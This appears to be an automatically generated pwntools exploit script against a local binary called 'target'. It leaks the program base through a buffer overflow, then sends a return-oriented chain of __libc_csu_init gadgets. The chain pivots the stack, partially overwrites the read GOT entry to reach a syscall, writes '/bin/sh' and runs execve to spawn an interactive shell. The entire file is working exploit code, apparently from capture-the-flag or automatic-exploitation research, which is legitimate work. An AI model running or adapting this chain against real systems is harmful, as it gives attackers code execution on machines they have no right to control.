#!/usr/bin/env python3
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf = ELF('target', checksec=False)
__libc_csu_init = 0x1250
__libc_csu_init_call_target = 0x4888
__libc_csu_init_gadget1 = 0x12a6
__libc_csu_init_gadget2 = 0x1290
canary = 0x0
elf_base = 0x0
pivot_dest = 0x4850
pop_rsi_r15_ret = 0x12b1

def solve_stage1(canary, elf_base, iostates) -> bytes:
    os.system('./launch-crax.sh -c {} -e {} -s {}'.format(hex(canary), hex(elf_base), iostates))
    with open('stage1.bin', 'rb') as f:
        return f.read()

if __name__ == '__main__':
    proc = elf.process()

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 72)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    # leaking: code
    proc.recv(72)
    elf_leak = u64(proc.recv(6).ljust(8, b'\x00'))
    elf_base = elf_leak - 0x1169
    log.info('leaked elf_base : {}'.format(hex(elf_base)))

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 128)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 48), skipping

    # input state (offset = 48), skipping

    # input state (offset = 48)
    # rop chain
    payload  = solve_stage1(canary, elf_base, 'o,i72,o72,o,i128,o,o,i48,i48,i48')[200:296]
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x1)
    payload += p64(0x0)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x2)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(elf_base + elf.sym['_fini'])
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x3)
    payload += p64(0x0)
    payload += p64(elf_base + elf.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x4)
    payload += p64(0x0)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x5)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x0)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + pop_rsi_r15_ret)
    payload += p64(elf_base + pivot_dest + 0x8 + 0x30 * 0x6)
    payload += p64(0x0)
    payload += p64(elf_base + elf.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(elf_base + pivot_dest + 0x30 * 0x7)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x400)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(0x0)
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(elf_base + elf.got['read'])
    payload += p64(0x1)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(elf_base + elf.bss())
    payload += p64(0x3b)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + elf.sym['read'])
    payload += p64(elf_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(elf_base + elf.bss())
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(elf_base + __libc_csu_init_call_target)
    payload += p64(elf_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(elf_base + 0x12b3)
    payload += p64(elf_base + elf.bss())
    payload += p64(elf_base + elf.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x40'
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    proc.send(payload)
    time.sleep(0.2)

    proc.interactive()
